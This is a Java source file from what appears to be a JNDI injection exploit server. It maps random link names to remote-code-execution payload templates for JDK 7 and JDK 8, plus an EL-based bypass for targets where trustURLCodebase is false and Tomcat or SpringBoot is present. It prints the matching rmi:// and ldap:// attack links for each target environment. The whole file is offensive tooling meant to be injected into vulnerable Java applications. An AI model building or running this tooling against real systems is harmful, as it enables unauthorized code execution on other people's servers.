package util;

import org.apache.commons.lang3.RandomStringUtils;

import static run.ServerStart.addr;
import static run.ServerStart.rmiPort;
import static run.ServerStart.ldapPort;
import static run.ServerStart.withColor;

import java.util.HashMap;
import java.util.Map;

/**
 * @Classname Mapper
 * @Description Init the JNDI links
 * @Author Welkin
 */
public class Mapper {

    public final static Map<String,String> references = new HashMap<>();
    public final static Map<String,String> instructions = new HashMap<>();
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_BLUE = "\u001B[34m";


    static {
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"ExecTemplateJDK8");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"ExecTemplateJDK7");
        references.put(RandomStringUtils.randomAlphanumeric(6).toLowerCase(),"BypassByEL");

        instructions.put("ExecTemplateJDK8","Build in "+ withColor("JDK 1.8",ANSI_RED) +" whose trustURLCodebase is true");
        instructions.put("ExecTemplateJDK7","Build in "+ withColor("JDK 1.7",ANSI_RED) +" whose trustURLCodebase is true");
        instructions.put("BypassByEL","Build in "+ withColor("JDK",ANSI_RED) +" whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath");

        System.out.println("----------------------------JNDI Links---------------------------- ");
        for (String name : references.keySet()) {
            String reference = references.get(name);
            System.out.println("Target environment(" + instructions.get(reference) +"):");
            if (reference.startsWith("Bypass")){
                System.out.println(withColor("rmi://"+ addr +":"+ rmiPort +"/" + name, ANSI_PURPLE));
            }else {
                System.out.println(withColor("rmi://"+ addr +":"+ rmiPort +"/" + name, ANSI_PURPLE));
                System.out.println(withColor("ldap://"+ addr +":"+ ldapPort +"/" + name, ANSI_PURPLE));
            }
        }
        System.out.println();
    }

    public static void main(String[] args) {
        System.out.println();
    }
}
